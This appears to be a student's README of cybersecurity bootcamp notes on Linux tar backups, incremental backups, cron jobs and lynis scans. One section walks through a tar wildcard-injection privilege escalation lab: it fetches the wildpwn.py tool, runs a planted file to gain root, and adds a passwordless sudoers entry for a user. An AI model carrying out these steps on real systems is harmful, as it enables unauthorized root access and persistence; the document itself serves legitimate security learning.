# Linus operating system file structure assessment and user control
Date of publication: 2/2/2021

I am writing this readme to reinforce and document things I leant during the University of Pensylvania Cybersecurity Engineer certification training so I can circle back to it later


## Random Usefulthings

- `ls -l admit discharge` displays the files inside and the permissions of the folders
- `ls -lat` here lat are instructions where `l` list of files, `a` displays entries starting with `.` means also shows hidden files and folders and `t` Sort by time modified. 

- `sudo mkdir -p /usr/share/{doctors,patients,treatments}` Creating a parent and child directory in a single command by using `-p` option

## `tar` for full and incremental backup

`tar [option(s)] [archive_name] [objects_to_archive]`

`sudo tar cvf hurricane-backup-10-11-2018.tar /var/log`


- `sudo tar cvvf 2018-10-12-hurricane-backup.tar /var/log`

    ```
    -rw-r--r--  root/root      5784  2019-07-03  15:38   /var/log/fontconfig.log
    -rw-r-----  syslog/adm   141571  2019-07-1-  11:16   /var/log/kern.log.2.gz
    -rw-rw-r--  root/utmp     20352  2019-07-15  15:33   /var/log/wtmp
    -rw-r--r--  root/root       695  2019-07-05  21:09   /var/log/vboxadd-install.log
    ```

    
`gunzip 2018-10-12-hurricane-backup.tar`

`ls -l 10May2019-235536-0700.tar` This will show the permissions of the tar file

- checking/listing files inside the .tar file

  - `tar tvvf 10May2019-235536-0700.tar | less`


  ## Creating a .tar file for archiving
   `tar cvvWf 20190505epscript.tar epscript/ > 20190505epscript.txt`
   Here the .txt file outputs the log file detailing file characteristics of all the files that are archived in the .tar file or the results of the command. Note that you must not be in the epscript folder if that is the folder you are taring. THe `W` is important to check for errors to make sure that the backup was not corrupt and should always be used

   `cd ~/Documents/epscript/` for partial address to path
   `ls -l doctors` This will list all the files in the folder, as well as the files in the sub-folders and are labled by the folders they are in, along with their permissions but this folder must be a subdirectory of the epscript

   `grep -R "Mark,Lopez" epscript/`  Searching a particular patient in a given directory files



  ## Extracting files from the archive

   - `mkdir restored_emails`

    x is extraction -C restored_emails is where the extraction will be done , wildcards *.csv is extracting only the csv files
   `tar xvvf 10May2019-235536-0700.tar -C restored_emails --wildcards "*.csv"`


## Incremental Backups

- After initial full backup you only perform subsequent backup of files that have changed- Saves memory, can be done hourly or daily. It is a special type of tar. Here emergency is the folder being archived

- `$ tar cvvWf emerg_back_sun.tar --listed-incremental=emerg_backup.snar --level=0 emergency`

- This creates 2 files one is emerg_back_sun.tar and the second is emerg_backup.snar-the later only stores the changes

- here level=0 tells that this is going to be the first in the series of backups.

## Restoring the backed up data


- Commands in sequence

- After you are in the right directory, typically the folder containing the folder to be archived

- `tar cvvWf emerg_back_sun.tar --listed-incremental=emerg_backup.snar --level=0 emergency`

- `tar tvvf emerg_back_sun.tar --incremental`

This is me changing the files to test backup
 - `echo "New file for CJones" > emergency/admit/file6`

 Monday backup

 - `tar cvvWf emerg_back_mon.tar --listed-incremental=emerg_backup.snar emergency`

 - `tar tvvf emerg_back_mon.tar --incremental`

  Tuesday backup- updatung the file and then testing that only the changed or new files are svaed in the new backup file for tuesday

     - `echo "Update MSmith" >> emergency/discharge/file2`

        - `tar cvvWf emerg_back_tues.tar --listed-incremental=emerg_backup.snar emergency`

        - `tar tvvf emerg_back_tues.tar --incremental`

 Listing all incremental files in the epscript folder       

- `ls -l *.tar`

- `rm -r emergency`  

 - `ls`

Extracting the data from archive - run this in the folder where you want the archive to unpack- typically its a folder for example running the command below will create
 ### - Extraction `tar xvvf emerg_back_sun.tar --incremental`

The testenvir folder contains the folder called patient. Then I have initially backed up this folder testenvir into a tar file called epscript_back_sun.tar. Then I manually go and delete the patient folder from the real testenvir folder to simulate an attack. Then I extract the patient folder from the escript_back_sun.tar- It will automatically replace the specified folder in the actual place. 

- Archiving
`tar cvvWf epscript_back_sun.tar --listed-incremental=epscript_backup.snar --level=0 testenvir`


- Simulating an attack by removing only one folder - doing this while being inside epscript that contains the tar file as well as the original
`rm -r testenvir/patient/`

                - Check that the patient folder is gone
            
                 `ls -l testenvir`

- Extracting/Replacing that specific folder only- inthis case the patient folder inside the original testenvir
`tar xvvf epscript_back_sun.tar -R -C ~/Documents/epscript/ testenvir/patient/`

                      `ls -l testenvir`
                - Now you will see that the folder has reappeared

- Baking up data of user1

 - `tar cvvWf backup.tar --listed-incremental=backup.snar --level 0 archive/home/user1`

 - Then I am changing the files. In the patient folder of the testenvir folder I have created more files called patient.0a and patient.0b

 - Creating a new Monday backup

- `tar cvvWf epscript_back_mon.tar --listed-incremental=epscript_backup.snar testenvir`

- Checking that the new files were backed up - the command below will list the files in the 

`tar tvvf epscript_back_mon.tar --incremental | less`

- Note the **Y**, **N**, **D** markings of the files. Y are the new files that are archived even in the incremental backup file. The N are the files in the main old backup that were not changed and hence not saved in the incremental backup either and D indicates that the file is a directory. If only one file changes in a directory, the entire directory is backed up again


## Exploiting `tar`

- Create a new folder exploitar. It should be in the same folder that will be archived
    - `wget https://raw.githubusercontent.com/localh0t/wildpwn/master/wildpwn.py`
    - `ls -lat` this mill show the hidden files as well as display as modified by time
- Run the python script

- `python wildpwn.py tar .` Running the python script. This . is important. It is telling the script to create malacious files to listen for the tar command
- The tar command must be run from the folder where the file is 
- `ls -lat` `cd .cache` `ls -lat` in sequence
- `./.cachefile` running the .cachefile. Running this malacious script you can switch to the root user
- `visudo` to add jane to sudoers and eliminate the need for pw - that way you do not have to steal the password. `jane   ALL=(ALL) NOPASSWD:ALL`
- `su jane`
- `sudo -l` you cna open shadow file, if so then you have successfully converted Jane to a super user
- `rm -r ~/Documents/ExploitTar`

- A software `tripwire` can alert you when users download wildpwn or when backup creat files like .cache

### Archiving all the files and folders in the current directory

- `tar cvf backuptarfilename.tar ./*`

However this command is dangerous as it has loopholes for the hackers to exmploit. 
**Usig the Checkpoints** 

- Usually done to keep in check the disk space

- `--checkpoint=1000` and  `--checkpoint-action=du`

- The general syntax of checkpoint commands:

    - `--checkpoint=[n]` 

    - `--checkpoint-action=[ACTION]`

    **Arbitrary Command execution** or **ACE** Vulnerabilities
    
    - Hackers can exploit to tar command to plant malacious code and gain root privilidges



**Running a python script**

- `python wildpwn.py tar`



## Cron Command for automation of Tasks

Cron jobs run under the same permissions as the user who ran them

- Crontab is Cron table
 - `crontab -l` shows lists of scheduled tasks. Usually its a list of when to run a certain timed script
 - `crontab -e` allows editing of the cron tab
 - `systemctl status cron` will show the current status of cron



**Check crontabs in the system, including each user**
- `sudo ls -l /var/spool/cron/crontabs`
- `sudo ls -l /var/spool/cron/crontabs | grep sysadmin`
 >Example

 - `0 23 * * 6     rm ~/Downloads/*`

  - `m h  dom mon dow   command`  as _minute_, _hour_, _day of month_, _month of year_, and _day of week_
 
- Minutes are specified with 0-59.

- Hours are specified with 0-23, with 0 being midnight.

- Day of month is specified with 0-31, or however many days are in that month.

- Month of year is specified with 1-12, with 1 being January.

- Day of week is specified with 0-7, with 0 and 7 being Sunday, 1 being Monday, and so forth.

   - Some systems allow you to use three-letter abbreviations as well, such as `SAT` or `MON`. When in doubt, use numbers, which are universally understood.

- In a crontab, the `*` character means "every." For example, `*` in the day value means "every day."

[Crontab Generator](https://crontab-generator.org)
[crontab.guru](https://crontab.guru)

  - `0 6 * * 1-5     rm ~/Downloads/*`


  -  `0 6 * * 1-5` translates to **at 6AM sharp, every week, every month, (Mon - Fri)**.

   - `sudo ls /var/spool/cron/crontabs`
    - `sudo tail /var/spool/cron/crontabs/instructor`

> The difference between root and user crontab

-  `sudo crontab -l` running crontab as root - It is exact same as the `crontab -l`, but it runs with root privilidges and runs the risk of being a target from the hacker

## Making scripts

- `nano cleanup_downloads.sh`

- `chmod +x cleanup_downloads.sh` Giving execuatable properties to the bash script

 - `sudo ./cleanup_downloads.sh` executing the script after navigating to the directory where it is located


 ## user cron tabs vs system-wide cron directories

 - `less /etc/crontab` Inspecting crontab script

 - `/etc/cron.d`  This stores scripts that are run are run at custom times

- `/etc/cron.daily`

- `/etc/cron.weekly`

- `/etc/cron.monthly`


## Automating the running of the system scans

- `sudo lynis show groups` listing scans run by lynis
- `sudo lynis show help`